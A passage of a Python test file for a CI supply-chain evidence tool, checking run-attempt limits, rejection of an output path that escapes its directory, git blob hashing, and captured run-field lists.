            "GIT_AUTHOR_NAME": "Test",
            "GIT_AUTHOR_EMAIL": "test@example.invalid",
            "GIT_COMMITTER_NAME": "Test",
            "GIT_COMMITTER_EMAIL": "test@example.invalid",
        }
        subprocess.run(
            ["/usr/bin/git", "-C", root, "commit", "-q", "-m", "fixture"],
            check=True,
            env=environment,
        )
        commit = (
            subprocess.check_output(
                ["/usr/bin/git", "-C", root, "rev-parse", "HEAD"]
            )
            .decode()
            .strip()
        )
        return root, commit

    def environment(self, commit: str, attempt: int = 2) -> dict[str, str]:
        return {
            "GITHUB_ACTIONS": "true",
            "GITHUB_REPOSITORY": "sepahead/haldir",
            "GITHUB_REPOSITORY_ID": str(PROTOCOL.REPOSITORY_ID),
            "GITHUB_REPOSITORY_OWNER_ID": str(
                PROTOCOL.REPOSITORY_OWNER_ID
            ),
            "GITHUB_WORKFLOW": "ci",
            "GITHUB_JOB": "supply-chain",
            "GITHUB_SHA": commit,
            "GITHUB_REF": "refs/heads/main",
            "GITHUB_WORKFLOW_REF": (
                "sepahead/haldir/.github/workflows/ci.yml@refs/heads/main"
            ),
            "GITHUB_EVENT_NAME": "push",
            "GITHUB_RUN_ID": str(RUN_ID),
            "GITHUB_RUN_ATTEMPT": str(attempt),
            "GITHUB_RUN_NUMBER": str(RUN_NUMBER),
        }

    def test_attempt_two_emission(self) -> None:
        with tempfile.TemporaryDirectory() as name:
            repo, commit = self.make_repo(Path(name))
            value = RESULT.build_result(
                repo, workflow="ci", environment=self.environment(commit)
            )
            self.assertEqual(value["execution"]["run_attempt"], 2)

    def test_attempt_nine_is_rejected(self) -> None:
        with tempfile.TemporaryDirectory() as name:
            repo, commit = self.make_repo(Path(name))
            with self.assertRaisesRegex(RuntimeError, "RUN_ATTEMPT"):
                RESULT.build_result(
                    repo,
                    workflow="ci",
                    environment=self.environment(commit, attempt=9),
                )

    def test_output_traversal_is_rejected(self) -> None:
        with tempfile.TemporaryDirectory() as name:
            with changed_directory(Path(name)):
                with self.assertRaisesRegex(RuntimeError, "RESULT_OUTPUT"):
                    RESULT._write_exclusive(
                        Path("../escape.json"),
                        b"{}\n",
                        expected_name="expected.json",
                    )


class CapturePrimitiveTests(unittest.TestCase):
    def test_blob_record_matches_git_object_format(self) -> None:
        value = CAPTURE._blob_record("evidence.json", b"{}\n")
        completed = subprocess.run(
            ["/usr/bin/git", "hash-object", "--stdin"],
            input=b"{}\n",
            stdout=subprocess.PIPE,
            check=True,
        )
        self.assertEqual(
            value["git_object_id"], completed.stdout.decode().strip()
        )

    def test_epoch11_field_contracts(self) -> None:
        self.assertEqual(
            CAPTURE._run_fields(epoch11=True, attempt=False),
            (
                "attempt,conclusion,createdAt,databaseId,event,headBranch,"
                "headSha,jobs,number,status,updatedAt,url,workflowDatabaseId,"
                "workflowName"
            ),
        )
        self.assertIn(
            "startedAt",
            CAPTURE._run_fields(epoch11=True, attempt=True),
        )


if __name__ == "__main__":
    unittest.main(verbosity=2)
